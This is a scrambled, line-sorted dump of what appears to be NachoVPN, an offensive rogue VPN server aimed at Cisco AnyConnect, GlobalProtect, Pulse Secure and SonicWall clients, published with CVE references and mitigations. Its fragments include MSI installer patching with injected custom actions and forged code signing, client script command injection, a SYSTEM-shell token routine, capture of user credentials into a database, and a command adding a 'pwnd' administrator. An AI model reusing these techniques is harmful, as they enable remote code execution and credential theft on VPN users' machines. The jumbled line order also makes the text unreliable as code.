    <Directory>Network Access Manager
    <Directory>Profile
    <Directory>Umbrella</Directory>
    <DownloadRemoveEmpty>false</DownloadRemoveEmpty>
    <FileExtension>asp</FileExtension>
    <FileExtension>fsp</FileExtension>
    <FileExtension>isp</FileExtension>
    <FileExtension>json</FileExtension>
    <FileExtension>nsp</FileExtension>
    <FileExtension>nvmsp</FileExtension>
    <FileExtension>vpnm</FileExtension>
    <FileExtension>xml</FileExtension>
    <FileName></FileName>
    <FileName>AMPEnabler_ServiceProfile.xml</FileName>
    <FileName>CustomerExperience_Feedback.xml</FileName>
    <FileName>ISEPosture.json</FileName>
    <FileName>ISEPostureCFG.xml</FileName>
    <FileName>NVM_ServiceProfile.xml</FileName>
    <FileName>OrgInfo.json</FileName>
    <FileName>VpnMgmtTunProfile.xml</FileName>
    <FileName>configuration.xml</FileName>
    <X509Data>
    <accept-cookie>no</accept-cookie>
    <agent-user-override-timeout>0</agent-user-override-timeout>
    <agent-user-override>disabled</agent-user-override>
    <allow-traffic-blocking-notification-dismissal>yes</allow-traffic-blocking-notification-dismissal>
    <append-local-search-domain>no</append-local-search-domain>
    <auto-discovery-external-gateway-2fa>no</auto-discovery-external-gateway-2fa>
    <can-change-portal>yes</can-change-portal>
    <can-continue-if-portal-cert-invalid>yes</can-continue-if-portal-cert-invalid>
    <can-save-password>yes</can-save-password>
    <captive-portal-detection-msg>
    <captive-portal-exception-timeout>600</captive-portal-exception-timeout>
    <captive-portal-login-url/>
    <captive-portal-notification-delay>5</captive-portal-notification-delay>
    <cdl-log>no</cdl-log>
    <change-password-message/>
    <client-upgrade>transparent</client-upgrade>
    <collect-hip-data>no</collect-hip-data>
    <connect-timeout>60</connect-timeout>
    <cookie-encrypt-decrypt-cert/>
    <cutoff-time>50</cutoff-time>
    <cutoff-time>5</cutoff-time>
    <default-browser>no</default-browser>
    <default>
    <dem-agent>not-install</dem-agent>
    <diagnostic-servers/>
    <disconnect-reasons/>
    <display-captive-portal-detection-msg>yes</display-captive-portal-detection-msg>
    <display-name>AnyConnect AMP Enabler</display-name>
    <display-name>AnyConnect DART</display-name>
    <display-name>AnyConnect ISE Posture</display-name>
    <display-name>AnyConnect Network Access Manager</display-name>
    <display-name>AnyConnect Network Visibility</display-name>
    <display-name>AnyConnect Posture</display-name>
    <display-name>AnyConnect SBL</display-name>
    <display-name>AnyConnect Secure Mobility Client</display-name>
    <display-name>AnyConnect Umbrella Roaming Security</display-name>
    <display-traffic-blocking-notification-msg>yes</display-traffic-blocking-notification-msg>
    <display-tunnel-fallback-notification>yes</display-tunnel-fallback-notification>
    <enable-advanced-view>yes</enable-advanced-view>
    <enable-do-not-display-this-welcome-page-again>yes</enable-do-not-display-this-welcome-page-again>
    <enable-signout>yes</enable-signout>
    <enforce-dns>no</enforce-dns>
    <enforce-globalprotect>no</enforce-globalprotect>
    <enforcer-exception-list-domain>
    <enforcer-exception-list>
    <external>
    <flush-dns>no</flush-dns>
    <generate-cookie>no</generate-cookie>
    <help-page-2/>
    <help-page/>
    <hip-report-interval>3600</hip-report-interval>
    <host>{{ dns_name }}</host>
    <init-panel>yes</init-panel>
    <internal-gateway-2fa>no</internal-gateway-2fa>
    <internal>
    <ip-address>10.0.150.1</ip-address>
    <ipsec-failover-ssl>1</ipsec-failover-ssl>
    <ipv6-preferred>no</ipv6-preferred>
    <krb-auth-fail-fallback>yes</krb-auth-fail-fallback>
    <length>{compressed_length}</length>
    <logout-remove-sso>yes</logout-remove-sso>
    <manual-only-gateway-2fa>no</manual-only-gateway-2fa>
    <max-agent-user-overrides>0</max-agent-user-overrides>
    <max-internal-gateway-connection-attempts>0</max-internal-gateway-connection-attempts>
    <max-wait-time>20</max-wait-time>
    <member>0.0.0.0/0</member>
    <member>1.1.1.1/32</member>
    <member>1.1.1.1</member>
    <member>{{ gateway_ip }}/32</member>
    <mfa-enabled>no</mfa-enabled>
    <mfa-listening-port>4501</mfa-listening-port>
    <mfa-notification-msg>You have attempted to access a protected resource that requires additional authentication. Proceed to authenticate at</mfa-notification-msg>
    <mfa-prompt-suppress-time>0</mfa-prompt-suppress-time>
    <mfa-trusted-host-list/>
    <none/>
    <offset>{data_offset}</offset>
    <passcode/>
    <password-expiry-message/>
    <portal-2fa>no</portal-2fa>
    <portal-timeout>60</portal-timeout>
    <pre-logon-tunnel-rename-timeout>-1</pre-logon-tunnel-rename-timeout>
    <preserve-tunnel-upon-user-logoff-timeout>0</preserve-tunnel-upon-user-logoff-timeout>
    <proxy-multiple-autodetect>no</proxy-multiple-autodetect>
    <receive-timeout>60</receive-timeout>
    <rediscover-network>yes</rediscover-network>
    <resubmit-host-info>yes</resubmit-host-info>
    <retry-timeout>50</retry-timeout>
    <retry-tunnel>30</retry-tunnel>
    <save-user-credentials>1</save-user-credentials>
    <script><![CDATA[
    <show-agent-icon>yes</show-agent-icon>
    <size>{extracted_length}</size>
    <split-tunnel-option>network-traffic</split-tunnel-option>
    <ssl-only-selection>0</ssl-only-selection>
    <title>{package_name}</title>
    <traffic-blocking-notification-delay>5</traffic-blocking-notification-delay>
    <traffic-blocking-notification-msg>
    <tunnel-mtu>1400</tunnel-mtu>
    <uninstall>allowed</uninstall>
    <uri>binaries/anyconnect-win-4.9.04053-amp-webdeploy-k9.msi</uri>
    <uri>binaries/anyconnect-win-4.9.04053-dart-webdeploy-k9.msi</uri>
    <uri>binaries/anyconnect-win-4.9.04053-gina-webdeploy-k9.msi</uri>
    <uri>binaries/anyconnect-win-4.9.04053-iseposture-webdeploy-k9.msi</uri>
    <uri>binaries/anyconnect-win-4.9.04053-nam-webdeploy-k9.msi</uri>
    <uri>binaries/anyconnect-win-4.9.04053-nvm-webdeploy-k9.msi</uri>
    <uri>binaries/anyconnect-win-4.9.04053-posture-webdeploy-k9.msi</uri>
    <uri>binaries/anyconnect-win-4.9.04053-umbrella-webdeploy-k9.msi</uri>
    <uri>binaries/anyconnect-win-5.9.04053-core-vpn-webdeploy-k9.msi</uri>
    <use-proxy>no</use-proxy>
    <use-sso-macos>no</use-sso-macos>
    <user-switch-tunnel-rename-timeout>0</user-switch-tunnel-rename-timeout>
    <welcome-page>
    <wsc-autodetect>yes</wsc-autodetect>
    @classmethod
    @staticmethod
    AllowDisableUpdate = 0
    AllowSavePassword = 0
    AllowSavePasswordInKeychain = 0
    AllowSavePasswordInKeychainFaceIDiOS = 0
    AllowSavePasswordInKeychainMac = 0
    AllowSavePasswordInKeystore = 0
    AllowSaveUser = 1
    BOOL bSuccess = FALSE
    CloseHandle(processesSnapshot)
    Compression = yes
    DWORD dwCreationFlags = NORMAL_PRIORITY_CLASS 
    DWORD sessionId
    ExitAfterDisconnect = 0
    HANDLE newToken = NULL
    HANDLE oldToken = NULL
    HANDLE privToken = NULL
    LPVOID pEnv = NULL
    LUID luid
    NX_TUNNEL_PROTO_VER = 2.0
    NoProfileCreate = 0
    PROCESSENTRY32W processInfo
    PROCESS_INFORMATION pi
    PppPref = async
    Route = 192.168.200.0/255.255.255.0
    STARTUPINFOW si
    SessionId = py0nwVXgydGW17JQXQRq6nYdObmqUQyrzEUTbK8os8I=
    TODO: Implement a NAT-based packet handler where the plugin provides a callback function
    TOKEN_PRIVILEGES tp
    TunnelAllMode = 0
    UninstallAfterExit = 0
    ZeroMemory(
    ]]>
    action_type = ACTION_TYPE_SHELL
    args = parser.parse_args()
    buf = io.BytesIO()
    buf.write(b'
    buf.write(b'xar!')                                  
    buf.write(dist_file_compressed)
    buf.write(hashlib.sha1(toc_compressed).digest())    
    buf.write(toc_compressed)
    build:
    class Constants:
    class PacketType:
    config = PulseConfig(data)
    config = generator.create_config()
    config.parse()
    container_name: nachovpn
    data_offset = SHA.digest_size
    def __init__(self):
    def __str__(self):
    def _setup_routes(self):
    def bootstrap(self):
    def close(self):
    def compile_payload(self):
    def create_config(self):
    def create_routes(self):
    def create_ssl_context(self):
    def download_latest_msi(self):
    def generate_ca_certificate(self):
    def generate_pkg(self):
    def get_free_nat_port(self):
    def get_latest_msi_version(self):
    def get_latest_versions(self):
    def get_thumbprint(self):
    def handle(self):
    def int_to_ipv4(addr):
    def ip_to_bytes(ip):
    def ipv4_to_int(ipv4):
    def is_enabled(self):
    def load_ca_certificate(self):
    def load_dns_certificate(self):
    def load_ip_certificate(self):
    def next_eap_identifier(self):
    def packet_sniffer(self):
    def padding_required(self):
    def parse(self):
    def patch_msi_files(self):
    def random_swap(self):
    def run(self):
    def send_keepalive(self):
    def setup(self):
    def setup_database(self):
    def setup_payload(self):
    def sign_msi_files(self):
    def subnet_mask_to_bytes(subnet_mask):
    def to_bytes(self):
    def to_dict(self):
    def verify_msi_files(self):
    def verify_payload(self):
    def write_be16(value):
    def write_be32(value):
    def write_le32(value):
    displayName = user
    dist_file = DIST_TEMPLATE.format(
    dist_file_compressed = zlib.compress(dist_file)
    dns1 = 1.1.1.1
    dns2 = 8.8.8.8
    downloader = MSIDownloader(output_dir=args.output_dir)
    elif '-q' in sys.argv or '--quiet' in sys.argv:
    else:
    entry_points={
    environment:
    except Exception as e:
    except KeyboardInterrupt:
    except:
    exit 2
    for arg in cert_args:
    for cert in certificates:
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s - [%(module)s.%(funcName)s]'
    function {installation_check} () {{
    gcc 
    gcc-mingw-w64 
    generator = VPNConfigGenerator()
    generator.hexdump(config)
    group = parser.add_mutually_exclusive_group()
    if '-d' in sys.argv or '--debug' in sys.argv:
    if (PopSystemShell()) {
    if (newToken != NULL) CloseHandle(newToken)
    if (oldToken != NULL) CloseHandle(oldToken)
    if (pEnv != NULL) DestroyEnvironmentBlock(pEnv)
    if (pi.hProcess != NULL) CloseHandle(pi.hProcess)
    if (pi.hThread != NULL) CloseHandle(pi.hThread)
    if (privToken != NULL) CloseHandle(privToken)
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
    if (sessionId == 0xFFFFFFFF 
    if any(cert_args) and not all(cert_args):
    if args.command:
    if args.increment:
    if args.name:
    if args.version:
    if key_file and cert_file and ca_file:
    if key_file and cert_file:
    if len(sys.argv) < 2:
    if not args.add_file and not args.command and not args.increment:
    if not outbuf:
    if os.name == 'nt':
    if os.path.exists(args.output):
    import msilib
    install_requires=[
    installation_check = random_string()
    ipv6Support = no
    libffi-dev 
    libssl-dev 
    log_level = logging.INFO
    logging.getLogger().setLevel(log_level)
    main()
    mingw-w64 
    msitools 
    networks:
    osslsigncode 
    parser = argparse.ArgumentParser()
    parser = argparse.ArgumentParser(description='Create a .pkg file for macOS and optionally sign it')
    parser = argparse.ArgumentParser(description='Download GlobalProtect MSI files')
    patcher = get_msi_patcher()
    ports:
    pppFrameEncoded = 0
    print(f'[
    processInfo.dwSize = sizeof(processInfo)
    restart: unless-stopped
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))
    return ''.join(random.choice(string.ascii_uppercase 
    return 0
    return None
    return SIGNATURE_TOC_ENTRY.format(
    return bSuccess
    return buf.getvalue()
    return hashlib.md5(random_name().encode()).hexdigest().upper()
    server = VPNServer()
    si.cb = sizeof(si)
    sig_toc_entry = ''
    that is called when a packet is received back from its destination and written to the client tunnel.
    toc_compressed = zlib.compress(toc_xml)
    toc_xml = TOC_TEMPLATE.format(
    try:
    volumes:
    x509_certs = ''
    }
    } else {
    }}
   </data>
   </div>
   </tr>
   <data>
   <name>Distribution</name>
   <offset>0</offset>
   <size>20</size>
   <tr>
   <type>file</type>
  </KeyInfo>
  </Profile>
  </access-routes>
  </agent-config>
  </agent-ui>
  </authentication-modifier>
  </authentication-override>
  </checksum>
  </dns>
  </exclude-access-routes>
  </file>
  </gateways-v6>
  </gateways>
  </hip-collection>
  </internal-host-detection>
  </root-ca>
  <access-routes>
  <admin-logout-notify-message>Your administrator has logged you out.</admin-logout-notify-message>
  <agent-config>
  <agent-ui>
  <agent-user-override-key>
  <authentication-modifier>
  <authentication-override>
  <bw-c2s>1000</bw-c2s>
  <bw-s2c>1000</bw-s2c>
  <client-role>global-protect-full</client-role>
  <connect-method>user-logon</connect-method>
  <creation-time>{creation_time}</creation-time>
  <default-gateway>192.168.99.1</default-gateway>
  <disconnect-on-idle>10800</disconnect-on-idle>
  <dns-suffix>
  <dns>
  <exclude-access-routes>
  <gateways-v6>
  <gateways>
  <gw-address>8.8.8.8</gw-address>
  <hip-collection>
  <inactivity-notify-message>Your GlobalProtect session will time out in 30 minutes. Please save your work before your session times out.</inactivity-notify-message>
  <inactivity-notify-prior>1800</inactivity-notify-prior>
  <internal-host-detection>
  <ip-address-preferred>yes</ip-address-preferred>
  <ip-address>192.168.99.122</ip-address>
  <ipv6-connection>no</ipv6-connection>
  <lifetime-notify-message>Your GlobalProtect session will expire in 30 minutes. Please save your work before your session expires.</lifetime-notify-message>
  <lifetime-notify-prior>1800</lifetime-notify-prior>
  <lifetime>2592000</lifetime>
  <mtu>0</mtu>
  <need-tunnel>yes</need-tunnel>
  <netmask>255.255.255.255</netmask>
  <no-direct-access-to-local-network>no</no-direct-access-to-local-network>
  <offset>20</offset>
  <on-demand>yes</on-demand>
  <panos-version>11.1.0</panos-version>
  <portal-config-version>4100</portal-config-version>
  <portal-name>GP-portal</portal-name>
  <portal-prelogonuserauthcookie>empty</portal-prelogonuserauthcookie>
  <portal-userauthcookie>empty</portal-userauthcookie>
  <portal>LDN-Gway</portal>
  <quarantine>no</quarantine>
  <refresh-config-interval>72</refresh-config-interval>
  <refresh-config>yes</refresh-config>
  <root-ca>
  <scep-cert-auth-cookie>empty</scep-cert-auth-cookie>
  <size>{signature_length}</size>
  <ssl-tunnel-url>/ssl-tunnel-connect.sslvpn</ssl-tunnel-url>
  <timeout>10800</timeout>
  <use-sso>no</use-sso>
  <user-email>bob@example.com</user-email>
  <user>bob</user>
  <user_expires>1711900239</user_expires>
  <version>{{ version }}</version>
  <wins>
  backend:
  certbot certonly 
  d.setTime(d.getTime() 
  document.cookie = cname 
  else
  exit 1
  fi
  if [[ $
  if(splitCookie[0].match(/
  nachovpn:
  var d = new Date()
  var splitCookie = cookieString.split('=')
  {signature_toc_entry}
 !y 
 '%'
 'px' : 0
 '}'
 '}')
 ( ( this.dir % 2 ) 
 ( this.amt 
 (!NELaunchX1)){
 (4 if self.vendor is not None else 0) 
 (4 if vendor is not None else 0) 
 (Windows only) 
 (p[10] 
 (p[11] 
 (p[8] 
 (p[9] 
 ) {
 ---- 
 ------- 
 -------- 
 ----------- 
 -eq 0 ]]
 //2 year
 //doing this inline causes unexpected bugs in early NS4
 0 : this.height - theHeight ) 
 0 : this.width - theWidth ) 
 0x01 
 0x10                    
 0x10                       
 0x2c00: known for Pulse version >= 9.1R14
 0x2e00: known for Pulse version >= 9.1R16
 0xfe000a4c
 0xffffff
 1 : this.amt ) )
 2:])
 2:offset 
 3}}  
 4                       
 4 > l:
 443 : parseInt(window.location.port)
 4] = self.write_be16(len(data) - offset)
 4] = self.write_be32(total_length - 0x10)
 4] = self.write_be32(total_length)
 6                       
 8:]
 <!-- Show Domains list box by default -->
 <!--LOGIN_PENDING-->
 <!--PERSISTENT_COOKIE-->
 </script>
 </toc>
 <signature-creation-time>461137009.8</signature-creation-time>
 <toc>
 A comma-separated list of plugins to disable. 
 AES key (32-bytes for AES-256)
 AVP(0xd6d)
 AVP_VENDOR:
 Action
 Add AVPs
 Add CustomAction
 Add additional routes specific to this plugin
 Add cabinet as a stream
 Add cabinet file to MSI
 Add new Media entry
 Add patches
 Add the AVP data
 Add the custom action to the MSI
 Add the property file to the MSI
 Add the sequence to the MSI
 Add to Component table
 Add to FeatureComponents table
 Add to File table
 Add to sequence
 Allow reuse of the address
 Allows overriding the calculated MD5 thumbprint for the server certificate. 
 Allows overriding the calculated SHA1 thumbprint for the server certificate. 
 Append to output buffer
 Apple Developer ID Installer
 Apple Extension Signing
 Apple Package Signing
 Attribute flag
 Attributes
 Attributes (compressed)
 Auth response (ok)
 Build CA certificate
 Build IFT packet
 Build server certificate signed by CA
 Build the AVP data dynamically using the AVP class
 Building a container image
 Building a wheel file
 Building for distribution
 Building for local development
 CONNECT tunnel is not currently supported
 CREATE_NEW_CONSOLE
 CVE 
 Calculate hashes
 Calculate progress
 Calculate routes length
 Call the parent class's route setup
 Certificate paths
 Check if CA cert already exists
 Check if MSI files are present
 Check if MSI files exist or if force download is enabled
 Cisco 
 Cisco AnyConnect 
 Common plugin kwargs
 Config
 Construct EAP packet
 Contributing
 Convert certificate and key to PEM format
 Convert to pkcs12 and save to codesign.pfx
 Copy default MSI file to payload directory
 Copy the certs
 Create Apple signing certificate
 Create a new CustomAction record
 Create a new cabinet file
 Create a new context for this connection
 Create a property to store the source
 Create the EAP data
 Create the EAP data from AVP
 Create the code signing certificate
 DSID cookie
 David Cash](https://github.com/AmberWolfCyber/presentations/blob/main/2024/Very%20Pwnable%20Networks%20-%20HackFest%20Hollywood%202024.pdf) [[video](https://www.youtube.com/watch
 Debugging
 Default 
 Define Flask routes within the class
 Delegate HTTP processing to PluginManager
 Demo 
 Description 
 Detect and alert on VPN clients executing non-standard child processes.
 Disabling a plugin
 Docker (optional)
 Download both MSI files
 ESP config length
 EXPANDED_JUNIPER struct
 EXPANDED_JUNIPER structures
 End of configuration packet
 Ensure SSL-VPN clients are updated to the latest version available from the vendor.
 Environment Variables
 Example packet:
 FROM 
 Final attributes
 Final packet - send the license ID
 Flags are stored in the most significant byte of the length field
 For some reason the property file needs to be added twice like this
 Gateway config
 Generate CA private key
 Generate a Windows code signing certificate
 Generate a private key
 Generate a private key for the code signing certificate
 Generate an Apple code signing certificate
 Generate server private key
 Generate the final routes section
 Generate the macOS pkg payload (GlobalProtect.pkg)
 Get CA cert
 Get a unique NAT port for this connection
 Get latest MSI version
 Get the highest existing sequence number from the File table
 HMAC key (32-bytes for SHA-256)
 Handle raw VPN data
 Header
 IFT-T/TLS Parser
 Ignore IDE/project-specific files
 Ignore cache files and directories
 Ignore compiled Python files
 Ignore coverage reports
 Ignore database files
 Ignore distribution files
 Ignore environment files
 Ignore log files and debugging artifacts
 Ignore temporary files
 Ignore testing artifacts
 Ignore virtual environment directories
 Ignore your specific directories
 Initialize database
 Installation
 Installing from source
 Ivanti Connect Secure 
 Julian Storr](https://www.nccgroup.com/uk/research-blog/making-new-connections-leveraging-cisco-anyconnect-client-to-drop-and-run-payloads/)
 Just keep reading from the client forever
 Just send a KEEPALIVE packet back to the client
 License
 Load default certificate (IP cert)
 Load the CA certificate into the gateway config
 Math.round( 100 
 Meh Chang](https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf)
 Mitigations
 Modify packet for NAT
 N/A 
 NE_progBar
 NachoVPN 
 New line after progress bar
 Not an SSL-VPN packet
 Number of routes (think this should be big endian)
 Operating Notes
 Packet Capture 
 Palo Alto GlobalProtect 
 PaloAlto 
 Parse the HTTP request line and headers
 Parse the tunelled packet
 Pass handling to data handler
 Patch the Windows MSI files and sign them
 Patch the msi files
 Payload options
 Payload storage
 Plugin 
 Plugins
 Prerequisites
 Privileged 
 Process TCP messages
 Process the TCP message data as needed
 Product 
 PulseSecure 
 Python 3.9 or later
 Query the Feature table to get the Feature key
 Re-calculate length for display purposes
 Re-calculate length to ensure it's current
 Rebuild MSI with modified tables
 Recalculate checksums
 Recalculate length
 References
 Register plugins
 Remove existing signed file
 Replace source IP with our IP
 Replace source port with NAT port
 Request a certificate from letsencrypt
 Routes length
 Routing info
 Run bootstrap
 Running
 SET 
 SSL-VPN packet types
 Save CA cert and key
 Save the new certificate to a file
 Save the private key
 Schedule the CustomAction in the appropriate sequence
 Section 2.5: The Keepalive and Dead Peer Detection Protocols
 Send a DPD-RESP packet back to the client
 Send headers
 Send the Flask response back to the client
 Send the packet out
 Sequence
 Sequence is the 8th column
 Set the SNI callback
 Set the new context
 Set up Jinja2 environment if template_dir is provided
 Set version in gateway config
 Setup certificates
 Setup plugin manager with cert hash
 Sign the MSI files
 Sign the certificate with the CA private key
 Skip headers
 SonicWall 
 SonicWall NetExtender 
 Source
 Start the tunnel
 TODO: log the client provided AVP data
 TODO: restore original IP and TCP ports
 TOKEN_ADJUST_SESSIONID
 TOKEN_ASSIGN_PRIMARY 
 TOKEN_DUPLICATE 
 TOKEN_QUERY
 TOKEN_READ 
 Target
 The DNS suffix to be used for Pulse Secure connections. 
 The Ivanti Connect Secure (Pulse Secure) URI handler can be triggered by visiting the 
 The Palo Alto GlobalProtect plugin requires that the MSI installers and 
 The SonicWall NetExtender URI handler can be triggered by visiting the 
 The command to be executed by the Cisco AnyConnect OnConnect.sh script on macOS. 
 The command to be executed by the Cisco AnyConnect OnConnect.vbs script on Windows. 
 The command to be executed by the Palo Alto installer MSI. 
 The command to be executed by the Palo Alto installer PKG on macOS. 
 The external IP address of the server. 
 The fully qualified domain name of the server. 
 The path to a file to be added to the Palo Alto installer MSI. 
 The path to the Pulse Secure logon script for macOS. 
 The path to the Pulse Secure logon script. 
 The username to be pre-filled in the Pulse Secure logon dialog. 
 Type
 URI Handler 
 URI handlers
 URL on the NachoVPN server.
 URL on the NachoVPN server. This requires that the SonicWall Connect Agent is installed on the client machine.
 Update the lengths
 Use Flask's test_client to handle the request
 VENDOR_JUNIPER)
 Variable 
 Verify downloads
 Verify that the MSI files are signed by our current CA
 Verify that the payload is signed by our current CA
 Version marker 
 WHERE 
 We got an EAP packet which we need to parse
 Whether to calculate the server certificate thumbprint dynamically from the server (useful if behind a proxy). 
 Whether to force the patching of the MSI installer if it already exists in the payloads directory. 
 Whether to save the Pulse Secure connection in the user's client. 
 Whether to use anonymous authentication for Pulse Secure connections. If set to 
 Whether to write captured PCAP files to disk. 
 Windows RCE 
 [AmberWolf Blog: NachoVPN](https://blog.amberwolf.com/blog/2024/november/introducing-nachovpn---one-vpn-server-to-pwn-them-all/)
 [CVE-2024-29014](https://blog.amberwolf.com/blog/2024/november/sonicwall-netextender-for-windows---rce-as-system-via-epc-client-update-cve-2024-29014/) 
 [CVE-2024-5921](https://blog.amberwolf.com/blog/2024/november/palo-alto-globalprotect---code-execution-and-privilege-escalation-via-malicious-vpn-server-cve-2024-5921/) (partial fix) 
 [The OpenConnect Project](https://www.infradead.org/openconnect/)
 [Windows](https://vimeo.com/1024773762) / [macOS](https://vimeo.com/1024773668) 
 [Windows](https://vimeo.com/1024773914) 
 [Windows](https://vimeo.com/1024774239) / [macOS](https://vimeo.com/1024773987) / [iOS](https://vimeo.com/1024773956) 
 [Windows](https://vimeo.com/1024774407) 
 a ) : ( this.amt - a )
 a : b 
 add final attrs to data
 additional_ekus
 allow overriding the thumbprint for fronting scenarios
 and 
 and attach any additional data from the DPD-REQ packet
 append to list as a dict so we can reconstruct later
 apt-get clean 
 apt-get install -y --no-install-recommends 
 attempt to compile the default payload from source
 attr_len 
 attribute
 attribute >= 9.1R14:')
 attribute >= 9.1R16:')
 auth expiry
 be 0x4f in big endian
 build a table of hashes for the script files
 but for now we'll just extract the password
 but it doesn't really matter for our use case
 cert MD5
 check if the first AVP is 0xD49
 check if the issuer Common Name matches our self-signed CA
 check if the second AVP is 0xD61
 checksum algorithm (sha1)
 command line argument instead.
 config for > 9.1R14
 counter
 current_size / total_size)
 cvalue 
 d.toUTCString()
 data
 datetime.timedelta(days=365)
 datetime.timedelta(days=3650)
 delete cookies set by rproxy bookmarks set for '/' 
 directory (or volume mount it into 
 directory. This simply spawns a new 
 document.write( '</td></tr></table></td></tr></table>
 environment variable.
 environment variable. For example:
 expires 
 figure out some offsets ..
 file are present in the 
 fill in the length of final attrs
 first EXPANDED_JUNIPER struct
 fix alignment
 fixed header value
 fixed value
 font-size: 15px
 font-size: 30px
 get required certificates
 git (optional)
 https://datatracker.ietf.org/doc/html/draft-mavrogiannopoulos-openconnect-02
 idle timeout
 if( !theDiv ) { window.status = 'Progress: ' 
 if( document.layers ) {
 if( theDiv.style ) { theDiv = theDiv.style
 increment the offset by the size of the signature data
 int(part) for part in parts])
 isCAArray.length==1 
 isCAArray[0] = 0
 isCAArray[0])
 isCAArray[domainIndex])
 isSAMLArray[domainIndex])
 iterate over the script_hashes and calculate the hash for each file
 len(eap_data)
 len(self.eap_data)
 len(self.value)
 len(value)
 length - (12 if vendor else 8)]
 length - 4] if length >= 4 else b''
 length including header
 length of TOC compressed data
 length of TOC uncompressed data
 length of header
 length:
 length:08x}  {hex_data:<{length 
 line-height: 1.2em
 list of EKUs
 list of SANs
 macOS RCE 
 magic
 margin: 0
 marker for ESP config
 more padding
 msitools (Linux only)
 net localgroup administrators pwnd /add
 nothing to worry about
 now populate the TOC entry
 now send the ESP config
 oPix
 or 
 osslsigncode (Linux only)
 p[15]))
 padding
 parse routing info
 parse the packet                    
 placeholder for length
 placeholder for length of the whole config
 placeholder for length: (len(config) - 0x10)
 placeholder: length of the rest of the config
 process attribute
 processName) {
 progress}{' ' 
 provide the templates directory relative to this plugin
 read the rest of the AVPs
 remove any padding
 return
 rm -rf /var/lib/apt/lists/
 script to download them.
 script:
 second EXPANDED_JUNIPER struct
 secrets length
 seems to be: EXPANDED_JUNIPER 
 self.ca_cert.public_bytes(serialization.Encoding.PEM))
 self.eap_data
 self.padding_required()
 send IF-T/TLS version: 2
 sequence 
 server thumbprint is a dictionary with sha1 and md5 hashes of the DNS cert
 server->client SPI in little endian
 sessionId == 0) {
 setup Flask app
 sha1 of compressed data
 sign NACAgent.exe
 size]
 skip certificate validation if we're overriding the thumbprint or retrieving it dynamically from the server
 skip on Windows for now (we can use signtool if needed)
 str(uuid.uuid4()).upper() 
 string.ascii_lowercase) for _ in range(length))
 the next bytes 
 the sonicwallconnectagent:// URI handler must use the external IP address and NOT the DNS name
 the user can provide their own sonicwall.pfx file in the certs directory
 theDiv.background = a
 theDiv.backgroundColor = a
 theDiv.clip = 'rect(0px '
 theDiv.height = theHeight 
 theDiv.pixelHeight = theHeight
 theDiv.pixelWidth = theWidth
 theDiv.top = ( ( this.dir != 4 ) 
 then
 there are some other fields/headers here we should maybe check
 this allows us to keep serving our origin certificate while advertising the proxy thumbprint
 this certificate may be volume mounted (e.g. when using certbot outside of the container)
 this helps to identify stale certificates when the CA certificate has been re-generated
 this is needed for certain proxies which require the origin has a valid certificate
 this.amt ) 
 this.amt : 1 ) )
 this.amt = 0
 this.height = oHi
 this.setBar = resetBar
 this.setCol = setColour
 this.width = oWi
 transition to IF-T/TLS
 type
 type: 0x1
 unknown (always 0x01000000)
 version
 via pip. You can then run the 
 window != window.opener 
 window.opener.location.host == window.location.host) {
 with the 
 write signature
 x < oDoc.layers.length
 } else {
 } if( this.amt < 0 ) { this.amt = 0
 } if( this.amt > 1 ) { this.amt = 1
 } }
!/bin/bash
!/usr/bin/env python3
"                                          ""C:"
"                                          ""InstallExecuteSequence"")"
"                                        additional_ekus=[ObjectIdentifier('1.3.6.1.5.5.7.3.5')],"
"                                        additional_sans=[x509.IPAddress(ipaddress.IPv4Address(self.ip_address)),"
"                                  message_identifier=0x01F5, message_value=(2).to_bytes(4, 'big'))"
"                                  message_identifier=0x01F6, message_value=JUNIPER_1.to_bytes(4, 'big'))"
"                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)"
"                             pkg_name, args.apple_cert, args.apple_key, args.ca_cert)"
"                            '-i', os.path.join(temp_dir, 'Component.idt'),"
"                            '-i', os.path.join(temp_dir, 'CustomAction.idt')], check=True)"
"                            '-i', os.path.join(temp_dir, 'Feature.idt'),"
"                            '-i', os.path.join(temp_dir, 'FeatureComponents.idt'),"
"                            '-i', os.path.join(temp_dir, 'File.idt'),"
"                            '-i', os.path.join(temp_dir, 'Media.idt')], check=True)"
"                            '-i', os.path.join(temp_dir, 'Property.idt'),"
"                            '-i', os.path.join(temp_dir, 'Property.idt')], check=True)"
"                            '-i', os.path.join(temp_dir, f'{sequence}.idt')], check=True)"
"                        ""("
"                        ""VALUES ("
"                        'cisco_command_win': self.cisco_command_win,"
"                        'plugins', 'base', 'templates', '404.html'), 'rb') as f:"
"                        <input id=""bottom-bar-button-1"" type=""button"" value=""Don't show again"" onclick=""hideLegcyUIWarning()"" />"
"                        <input id=""bottom-bar-button-3"" type=""button"" value=""Close"" onclick=""closeLegcyUIWarning()"" />"
"                        <p id=""bottom-bar-message-p"">"
"                        content = self.render_file(script_path, context)"
"                        major, minor, patch = map(int, version.split('.'))"
"                        max_sequence = max(max_sequence, int(row[7]))  "
"                        new_version = f""{major}.{minor}.{patch}"""
"                        password,"
"                        self.__class__.__name__,"
"                        self.send_header('Content-Type', 'text/html')"
"                        username,"
"                        writer = csv.writer(f, delimiter='"
"                        writer.writerow([feature_key, '', '', '', 2, 1, 'TARGETDIR', 0])"
"                    '<meta http-equiv=""refresh"" content=""0"
"                    'INSERT INTO credentials (username, password, other, plugin) VALUES ("
"                    (username, password, json.dumps(other_data) if other_data else None, plugin_name)"
"                    <div class=""bottom-bar-buttons"">"
"                    <div class=""bottom-bar-message"">"
"                    cert.signature,"
"                    cert.signature_hash_algorithm,"
"                    cert.tbs_certificate_bytes,"
"                    ctx.load_cert_chain(self.dns_cert_path, self.dns_key_path)"
"                    ctx.load_cert_chain(self.ip_cert_path, self.ip_key_path)"
"                    fake_ether = Ether(src=src_mac, dst=None)"
"                    logging.warning(f""Unhandled HTTP request from {self.client_address[0]}"")"
"                    logging.warning(f""Unhandled raw VPN data from {self.client_address[0]}: {first_line}"")"
"                    new_disk_id = max(new_disk_id, int(row[0])) "
"                    or self.handle_attr_elements(self.data[offset:], attr_len, self.pre_attributes):"
"                    other TEXT,"
"                    padding.PKCS1v15(),"
"                    parser = CTSP(data, handler.connection, packet_handler=self.packet_handler)"
"                    password TEXT,"
"                    password,"
"                    print (""attr_flag 0x2c00: known for Pulse version >= 9.1R14"")"
